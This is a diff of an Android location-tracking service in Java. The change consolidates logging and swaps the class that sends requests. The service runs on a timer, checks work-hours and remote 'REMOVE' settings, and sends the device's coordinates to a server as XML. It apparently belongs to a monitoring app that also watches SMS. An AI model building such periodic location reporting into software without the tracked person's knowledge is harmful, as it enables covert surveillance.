@@ -25,11 +25,12 @@ import android.os.IBinder;
 import android.preference.PreferenceManager;
 import android.util.Log;
 
-import com.inet.android.bs.FileLog;
 import com.inet.android.bs.MainActivity;
 import com.inet.android.bs.RequestMakerImpl;
-import com.inet.android.bs.WorkTimeDefiner;
+import com.inet.android.request.DataRequest;
 import com.inet.android.sms.SmsSentObserver;
+import com.inet.android.utils.Logging;
+import com.inet.android.utils.WorkTimeDefiner;
 
 public class GPSTracker extends Service implements LocationListener {
 
@@ -71,28 +72,25 @@ public class GPSTracker extends Service implements LocationListener {
 
 	@Override
 	public void onCreate() {
-		Log.d(TAG, ">>>onCreate() GPS");
-		FileLog.writeLog("locationManager: >>>onCreate() GPS");
+		Logging.doLog(TAG, "onCreate() GPS", "onCreate() GPS");
 	}
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		context = getApplicationContext();
 		contentObserved();
-		Log.d(TAG, "onStartCommand gpsTracker");
-		FileLog.writeLog("locationManager: onStartCommand gpsTracker");
+		
+		Logging.doLog(TAG, "onStartCommand gpsTracker", "onStartCommand gpsTracker");
 
 		sp = PreferenceManager.getDefaultSharedPreferences(context);
 		String gpsEnd = sp.getString("ACTION", "OK");
 		MIN_TIME_BW_UPDATES = Integer.parseInt(sp.getString("GEO", "5")) * 1000 * 60;
 		timeUp = Integer.parseInt(sp.getString("GEO", "5"));
 		if (gpsEnd.equals("REMOVE")) {
-			Log.d(TAG, "REMOVE");
-			FileLog.writeLog("locationManager: REMOVE");
+			Logging.doLog(TAG, "REMOVE", "REMOVE");
 			return 0;
 		}
-		Log.d(TAG, ">>>onStartCommand()");
-		FileLog.writeLog("locationManager: " + ">>>onStartCommand()");
+
 		Calendar cal = Calendar.getInstance();
 		cal.add(Calendar.MINUTE, timeUp);// через 5 минут
 		PendingIntent servicePendingIntent = PendingIntent.getService(this,
@@ -108,16 +106,11 @@ public class GPSTracker extends Service implements LocationListener {
 				servicePendingIntent);
 		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
 		if (!isWork) {
-			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
-			Log.d(TAG, "after isWork retrun 0");
-			FileLog.writeLog("locationManager: isWork return "
-					+ Boolean.toString(isWork));
-			FileLog.writeLog("locationManager: after isWork retrun 0");
+			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
+					"isWork return " + Boolean.toString(isWork));
 			return 0;
 		} else {
-			Log.d(TAG, Boolean.toString(isWork));
-			FileLog.writeLog("locationManager: isWork - "
-					+ Boolean.toString(isWork));
+			Logging.doLog(TAG, Boolean.toString(isWork), Boolean.toString(isWork));
 		}
 		getLocation();
 		super.onStartCommand(intent, flags, startId);
@@ -277,11 +270,13 @@ public class GPSTracker extends Service implements LocationListener {
 					+ "Last Update network: " + latitude + " " + longitude
 					+ "</cdata1><ttl>" + locMetod + "</ttl></packet>";
 
-			req = new RequestMakerImpl(context);
-			req.sendDataRequest(sendStr);
+//			req = new RequestMakerImpl(context);
+//			req.sendDataRequest(sendStr);
+			
+			DataRequest dr = new DataRequest(context);
+			dr.sendRequest(sendStr);
 
-			Log.d(TAG, sendStr);
-			FileLog.writeLog("locationManager: " + sendStr);
+			Logging.doLog(TAG, sendStr, sendStr);
 		}
 	}
 
@@ -294,11 +289,13 @@ public class GPSTracker extends Service implements LocationListener {
 				+ "</time><type>5</type><app>координаты неизвестны"
 				+ "</app><ttl>Определение местонахождения не поддерживается</ttl></packet>";
 
-		req = new RequestMakerImpl(context);
-		req.sendDataRequest(sendStr);
+//		req = new RequestMakerImpl(context);
+//		req.sendDataRequest(sendStr);
+		
+		DataRequest dr = new DataRequest(context);
+		dr.sendRequest(sendStr);
 
-		Log.d(TAG, sendStr);
-		FileLog.writeLog("locationManager: " + sendStr);
+		Logging.doLog(TAG, sendStr, sendStr);
 	}
 
 	@SuppressLint("SimpleDateFormat")
